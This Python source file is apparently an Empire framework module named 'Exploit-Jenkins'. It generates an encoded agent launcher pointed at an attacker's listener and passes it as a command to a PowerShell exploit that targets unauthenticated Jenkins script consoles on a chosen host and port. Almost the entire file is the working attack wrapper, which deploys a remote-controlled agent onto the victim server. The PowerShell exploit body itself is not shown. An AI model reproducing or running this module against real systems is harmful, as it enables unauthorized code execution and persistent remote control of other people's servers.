import base64

from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Exploit-Jenkins',

            'Author': ['@luxcupitor'],

            'Description': ("Exploit unauthenticated Jenkins Script consoles."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,
 
            'OpsecSafe' : False,

            'MinPSVersion' : '2',
            
            'Comments': [
                'Deploys an Empire agent to a windows Jenkins server with unauthenticated access to script console.'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Rhost' : {
                'Description'   :   'Specify the remote jenkins server to exploit.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Port' : {
                'Description'   :   'Specify the port to use.',
                'Required'      :   True,
                'Value'         :   '8080'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        #sysWow64 = self.options['SysWow64']['Value']

        isEmpire = self.mainMenu.listeners.is_listener_empire(listenerName)
        if not isEmpire:
            print helpers.color("[!] Empire listener required!")
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            #Cmd = launcher
            print helpers.color("Agent Launcher code: "+ launcher)

        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/exploitation/Exploit-Jenkins.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "\nExploit-Jenkins"
        script += " -Rhost "+str(self.options['Rhost']['Value'])
        script += " -Port "+str(self.options['Port']['Value'])
        script += " -Cmd \"" + launcher + "\""

        return script
